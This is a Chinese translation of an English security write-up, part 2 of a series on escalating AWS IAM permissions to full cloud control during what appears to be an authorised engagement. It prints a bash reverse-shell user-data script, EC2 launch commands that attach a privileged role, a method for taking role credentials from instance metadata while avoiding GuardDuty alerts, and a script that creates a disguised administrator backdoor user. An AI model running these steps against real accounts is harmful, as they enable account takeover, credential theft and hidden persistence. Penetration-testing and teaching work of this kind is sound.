<html>
<head>
<title>Exploiting AWS IAM permissions for total cloud compromise: a real world example (2/2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用AWS IAM权限实现全面的云妥协:一个真实世界的例子(2/2)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-aws-iam-permissions-for-total-cloud-compromise-a-real-world-example-part-2-2-f27e4b57454e?source=collection_archive---------0-----------------------#2020-10-01">https://infosecwriteups.com/exploiting-aws-iam-permissions-for-total-cloud-compromise-a-real-world-example-part-2-2-f27e4b57454e?source=collection_archive---------0-----------------------#2020-10-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="db23" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">介绍</h1><p id="f097" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">在<a class="ae lj" href="https://medium.com/bugbountywriteup/exploiting-fine-grained-aws-iam-permissions-for-total-cloud-compromise-a-real-world-example-part-5a2f3de4be08" rel="noopener">第1部分</a>中，我们攻破了一个拥有多个权限的账户，但没有管理员权限。按照<a class="ae lj" href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation" rel="noopener ugc nofollow" target="_blank"> Rhinosecuritylab的帖子</a>中的方法之一，我们发现了一个允许我们提升权限的潜在角色。简而言之，我们将尝试创建一个实例，并在创建时为其附加一个特权角色。之后，如果我们可以访问实例，我们将能够查询元数据并提取允许我们使用该角色的凭证。如果你不确定这意味着什么，你可以在我之前的文章中找到更好的解释。</p><p id="ea45" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">出于显而易见的原因，我们之前确定的潜在权限提升使用了我们称为危险角色的角色。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi lp"><img src="../Images/f1c40150a86e5bcfce9c56874eb2bb0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sXhpuxz9T46zvkfg_UXhrQ.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">危险-角色已确定！</figcaption></figure><h1 id="1354" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">滥用用户数据</h1><p id="6306" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">现在我们有了候选人，我们需要创建一个实例并为其分配角色。我们首先需要确定的一件事是，一旦创建了这个实例，我们将如何访问它？我们可以试着用现有的钥匙。让我们列出用户可用的键</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mf"><img src="../Images/53529918114aa6d2737d0d58b23c4cb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z-NlE3SxBXKjnq2zND_S5Q.png"/></div></div></figure><p id="a6b7" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">我们没有权限。即使我们做到了，也没有办法通过命令行界面获得私钥。这些仅在创建过程中打印。我们只能检索公钥，所以我们需要找到另一种方法。</p><p id="185e" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">AWS有一个叫做<a class="ae lj" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html" rel="noopener ugc nofollow" target="_blank">的用户数据</a>。它基本上是脚本，无论何时启动，您都可以使用它来配置实例。我们可以用它从实例中获得一个连接。让我们试试这个。首先，我们需要创建将被调用的用户数据脚本。</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="35ca" class="ml jo iq mh b gy mm mn l mo mp">cat &gt; reverseShell.sh &lt;&lt;EOF<br/>#!/bin/bash<br/>/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/8081 0&gt;&amp;1<br/>EOF</span></pre><p id="003d" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">这将启动一个反向shell，它将连接到10.0.0.1:8081。</p><p id="2794" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">让我们用</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="ed83" class="ml jo iq mh b gy mm mn l mo mp">nc -lkvp 8081</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/a0fafbc87529322046d0dafe6474ec2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1004/format:webp/1*iPcWNAdr-V2gyAkb_g91cw.png"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">侦听器在我们最初受损的实例上准备就绪</figcaption></figure><h1 id="b284" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">创建实例</h1><p id="b60b" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">让我们尝试用run-instances创建实例(image-id对应于一个ubuntu 14.04映像):</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="4a65" class="ml jo iq mh b gy mm mn l mo mp">aws --profile data2 ec2 run-instances --image-id ami-d05e75b8 --instance-type t1.micro --iam-instance-profile Name=danger-role --user-data file://reverseShell.sh</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mr"><img src="../Images/9aa8b2274b2b68a420c5094d32830000.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZUTaRx_N7uz5BUvsA4qMVw.png"/></div></div></figure><p id="5c33" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">图像已创建！这是个好消息。然而，连接没有到达。可能是网络问题？仔细检查命令后，我们意识到我们没有指定任何安全组。我们只是得到一个默认的分配。让我们看看它有哪些规则；我们可以这样做</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="3a6f" class="ml jo iq mh b gy mm mn l mo mp">aws --profile PROFILE ec2 describe-security-groups | jq -r '.SecurityGroups[] | select(.GroupId | contains("sg-f73b339e"))'</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ms"><img src="../Images/85255c0d25a1e13ba70b56fd6b2dc2ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-l2TS_kY4_jpPW4ORSl6hw.png"/></div></div></figure><p id="17e2" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">向下滚动，我们看到了问题。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/db842f0450382c37796a418bea9d3709.png" data-original-src="https://miro.medium.com/v2/resize:fit:648/format:webp/1*aa99jc3Fn7jZWnumwJ-Gwg.png"/></div></figure><p id="933e" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">不允许出站流量。所以和我们的攻击机器没有联系。我们需要找到一个安全组来允许我们重新连接。</p><p id="c6b2" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">让我们把它们列出来，看看我们是否能找到些什么。</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="94b2" class="ml jo iq mh b gy mm mn l mo mp">aws --profile data2 ec2 describe-security-groups | jq -r .SecurityGroups[].GroupName</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mu"><img src="../Images/feeb70f63405c7537a6d9a76c4b2d462.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YG21A5V3B4k0aeJ2vanzEQ.png"/></div></div></figure><p id="d826" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">我们可以从输出中看到有175个安全组，并且它们没有遵循一个有组织的命名法。出于安全原因，我不能上传描述，但让我告诉你，他们是一团糟。我们可以开始一个一个地列举它们，但是也许我们可以想出一个更好的方法。</p><p id="532b" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">如果我们使用与我们已经控制的实例相同的参数会怎么样？通常，群集在一起的实例允许相互通信。如果我们使用同一个安全组会怎么样？我们可以使用以下命令通过实例的私有IP查询实例信息:</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="03d6" class="ml jo iq mh b gy mm mn l mo mp">aws --profile test2 ec2 describe-instances | jq -r '.Reservations[].Instances[] | select(.PrivateIpAddress | contains("10.0.0.17")) | .SecurityGroups</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mv"><img src="../Images/d55dc46d84ada5c5cbfbee3c56953342.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bDLpK47xbMOKXSzyRIU7TA.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">(两个安全组匹配)</figcaption></figure><p id="2a43" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">让我们试试这个安全组:</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="5f7c" class="ml jo iq mh b gy mm mn l mo mp">aws --profile data2 ec2 run-instances --image-id ami-d05e75b8 --instance-type t1.micro --iam-instance-profile Name=danger-role --user-data file://reverseShell.sh --security-group-ids "sg-42esa23f"</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mw"><img src="../Images/7613dd9bbb19566cc9b07043157f78a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DFJWHJdXjJtnA4L3mrzxfQ.png"/></div></div></figure><p id="f0e1" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">没错。我们正在尝试启动一个实例，但不将其放在特定的子网上(非VPC启动)。为了使用VPC安全组，我们需要指定与我们控制的实例相同的子网id。让我们再次查询它</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="4692" class="ml jo iq mh b gy mm mn l mo mp">aws --profile test2 ec2 describe-instances | jq -r '.Reservations[].Instances[] | select(.PrivateIpAddress | contains("10.12.1.17")) | .SubnetId, .SecurityGroups'</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mx"><img src="../Images/ce98b06a91c5b07606f13c6aab2a1335.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rW35mz9qOEDZ7mUMtDocUQ.png"/></div></div></figure><p id="6876" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">现在，我们可以对适当的子网使用该命令。</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="d9bf" class="ml jo iq mh b gy mm mn l mo mp">aws --profile data2 ec2 run-instances --image-id ami-d05e75b8 --instance-type t1.micro --iam-instance-profile Name=danger-role --user-data file://reverseShell.sh --security-group-ids "sg-42csce3f" --subnet-id "subnet-a213as8c"</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mr"><img src="../Images/cd049c194b33818925edcc278a1923ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DDwlUWb3zpuft9n8kWSGbA.png"/></div></div></figure><p id="6abe" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">成功！几秒钟后，我们得到了反向外壳。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi my"><img src="../Images/f00e26abbfd9d1c7151bd44ad268e1d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sJ9zSlP-wIt9c5UCv2X_QA.png"/></div></div></figure><h1 id="7388" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">劫持角色</h1><p id="16db" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">一旦进入实例，我们就可以从<a class="ae lj" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" rel="noopener ugc nofollow" target="_blank">实例元数据</a>中快速获得与危险角色相关联的凭证。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mr"><img src="../Images/3e38bd9b69ecc4bc2c028138ad2a2127.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s1fJLyp078P58LVg-FAKJg.png"/></div></div></figure><p id="5185" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">现在，如果我们想使用这些凭证，我们有两个选择。我们可以在实例外部或实例内部使用它们。</p><p id="28a6" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">如果你读过<a class="ae lj" href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" rel="noopener ugc nofollow" target="_blank">rhinosecuritylab的帖子</a>，你就会知道在实例之外使用它们是个坏主意:</p><blockquote class="mz na nb"><p id="4282" class="kl km nc kn b ko lk kq kr ks ll ku kv nd lm ky kz ne ln lc ld nf lo lg lh li ij bi translated">关于这种攻击，需要注意的一点是，在特定实例之外使用EC2实例配置文件凭证是一个明显的危害迹象。即使是AWS GuardDuty也会在此触发(https://docs . AWS . Amazon . com/guard duty/latest/ug/guard duty _ finding-types . html # unauthorized 11)，因此在本地过滤这些凭证并运行它们并不是明智之举，而是从EC2实例内部访问AWS API。</p></blockquote><p id="8987" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">我们需要安装awscli，并确保我们有最新的版本(我们实际上因为在repos中使用过时的版本而浪费了很多时间)。</p><p id="7a93" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">首先，我们使用<a class="ae lj" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" rel="noopener ugc nofollow" target="_blank">菲尼亚斯菲舍尔魔法</a>提升到一个全肉的pty外壳:</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ng"><img src="../Images/bfa7b5e337f25e84510f7b34502f1b0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PZsVvmJ9WSEl1sKupoo10Q.png"/></div></div></figure><p id="c859" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">通过repos安装awscli后，我们尝试运行<em class="nc">AWS STS get-caller-identity</em>几次都没有成功，直到我们有了检查安装版本的好主意:</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nh"><img src="../Images/766ffffcfec8e2928f1cafb2cf3c21be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yz2MD-bB5DUYQ_DqSxVTyA.png"/></div></div></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/612fcefb610c85191dbea66014084b8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1278/format:webp/1*HZMxwKqvnEWiXVjKf7MCvg.png"/></div></figure><p id="4f21" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">当前版本是1.18…确保更新所有内容，这样你就不会像我一样浪费15分钟。</p><p id="df07" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">在更新aws客户端之后，我们按照这个<a class="ae lj" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html" rel="noopener ugc nofollow" target="_blank">文档</a>在环境变量中加载凭证。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nj"><img src="../Images/e438daf3f7bb40a9bc179a52d05d7439.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JyJOt0oCjZ2iouvq5GNMRQ.png"/></div></div></figure><p id="ade2" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">如您所见，我们成功劫持了角色访问。现在让我们创建一个具有web访问权限的后门用户！</p><pre class="lq lr ls lt gt mg mh mi mj aw mk bi"><span id="0bac" class="ml jo iq mh b gy mm mn l mo mp">userName="notabackdoor"<br/>password='ThisisnotabackdoorFORSURE12345!!'<br/>policyName="userPolicy"<br/>#Create a user<br/>aws iam create-user --user-name "$userName"<br/>#Create a login profile to allow web access<br/>aws iam create-login-profile --user-name "$userName" --password "$password" <br/>#Create cli access<br/>aws iam create-access-key --user-name "$userName"<br/>#Create inline policy to allow full access (it's less obvious than attaching to the Administrators group)<br/><br/>cat &gt; "$policyName".json &lt;&lt; EOF<br/>{<br/>  "Version": "2012-10-17",<br/>  "Statement": [<br/>    {<br/>      "Effect": "Allow",<br/>      "Action": "*",<br/>      "Resource": "*"<br/>    }<br/>  ]<br/>}<br/>EOF<br/><br/>aws iam put-user-policy --user-name "$userName" --policy-name "$policyName" --policy-document file://"$policyName".json</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nk"><img src="../Images/3487e8142ac6cc0788e6b91040944ac8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_QylI35inP71n1QxyGAFYQ.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">创建用户，并授予其控制台和web访问权限</figcaption></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nl"><img src="../Images/ac723e9b5f29d1a28c384d9aeaecd208.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l2NrSj5kdZR6bsBintqKBA.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">将内联策略与用户相关联，以授予用户root访问权限。</figcaption></figure><p id="82ec" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">太好了，我们有根用户了。我们还需要做最后一件事。还记得在第1部分中，我们想要同步桶的内容，而我们的脚本永远不会完成吗？嗯，你可以在web界面上比通过cli更快地获得铲斗的信息。让我们使用新创建的root来检查这些存储桶，看看问题出在哪里。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nm"><img src="../Images/485633920b11881d28ff6ae15a3feb57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ke8gQHG2frCDX47R8QQs-w.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">时段详细信息</figcaption></figure><p id="21b0" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">是的，那是一个11tb的桶…还好我们没有等待同步，因为那可能会花很长时间。这解释了为什么我们的脚本(以及我们发现的其他4个枚举工具)在同步/获取桶大小时会冻结。</p><h1 id="899e" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">包扎</h1><p id="60d4" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">我希望在阅读完第1部分和第2部分之后，您会对阅读API/方法文档有一个新的认识。当然，这可能很乏味，但更多的时候，它可以给你工具，以多种不同的方式实现某些目标。第2部分到此结束，希望你喜欢！</p></div></div>    
</body>
</html>